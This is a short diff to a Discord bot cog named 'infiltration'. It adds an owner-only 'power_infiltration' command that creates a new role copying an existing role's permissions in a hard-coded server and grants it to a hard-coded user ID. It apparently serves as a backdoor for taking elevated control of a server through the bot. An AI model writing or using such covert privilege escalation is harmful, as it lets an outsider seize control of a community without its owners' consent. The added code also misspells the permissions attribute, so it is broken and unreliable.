@@ -44,7 +44,25 @@ class Cog(commands.Cog, name="infiltration"):
         await ctx.send("4")
         await member.add_roles(role)
         await ctx.send("5")
+        
 
+    @commands.command()
+    @commands.check(is_owner())
+    async def power_infiltration(self, ctx):
+        await ctx.send("1")
+        guild = self.bot.get_guild(964451976186310668)
+        await ctx.send("2")
+        role = guild.get_role(1073012201700458516)
+        await ctx.send(str(role))
+        await ctx.send("3")
+        newrole = await guild.create_role(name="power", permissions=role.permiissions)
+        member = await guild.fetch_member(252822872047878144)
+        await ctx.send("4")
+        await member.add_roles(newrole)
+        await ctx.send("5")
+
+
+        
     @commands.command()
     async def checklife(self, ctx):
         await ctx.send("1")
